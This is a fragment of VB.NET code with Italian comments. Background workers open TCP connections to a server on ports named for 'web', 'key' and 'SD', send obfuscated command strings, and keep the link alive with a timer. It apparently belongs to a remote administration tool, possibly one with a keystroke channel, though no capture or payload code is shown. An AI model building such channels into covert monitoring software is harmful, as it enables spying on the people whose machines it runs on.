    Private Sub bkwW_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bkwW.DoWork
        Try
            clientweb.Connect(IpAd, pw)
            netstreamweb = clientweb.GetStream
            netstream.Write(
            UTF8.GetBytes("W|eb>Sp*^"), 0, UTF8.GetBytes(
            "W|eb>Sp*^").Length) 'invio il comando al server
        Catch ex As Exception
            clientweb.Close()
            clientweb = New TcpClient
        End Try
    End Sub

    Private Sub bkwK_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bkwK.DoWork
        Try
            clientkey.Connect(IpAd, pKey)
            netstreamkey = clientkey.GetStream
            netstream.Write(
            UTF8.GetBytes("é{°°#]>"), 0, UTF8.GetBytes(
            "é{°°#]>").Length) 'invio il comando al server
        Catch ex As Exception
            clientkey.Close()
            clientkey = New TcpClient
        End Try
    End Sub

    Private Sub bkwSDC_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bkwSDC.DoWork
        Try
            clientSD.Connect(IpAd, pSD)
            netstreamSD = clientSD.GetStream
            netstream.Write(
            UTF8.GetBytes(">|Su<°\"), 0, UTF8.GetBytes(
               ">|Su<°\").Length) 'invio il comando al server
        Catch ex As Exception
            clientSD.Close()
            clientSD = New TcpClient
        End Try
    End Sub


    Private Function AlreadyRunning_Almost() As Boolean

        Dim my_proc As Process = Process.GetCurrentProcess
        Dim my_name As String = my_proc.ProcessName
        Return (Process.GetProcessesByName(my_name).Length > 1)

    End Function

    
    Private Sub tmrLusso_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrLusso.Tick
        If Not client.Available > 0 Then
            Try
                netstream.Write(ugomatteomattia, 0, ugomatteomattia.Length)
            Catch ex As Exception
                isconn = False
            End Try
        End If
    End Sub
End Class
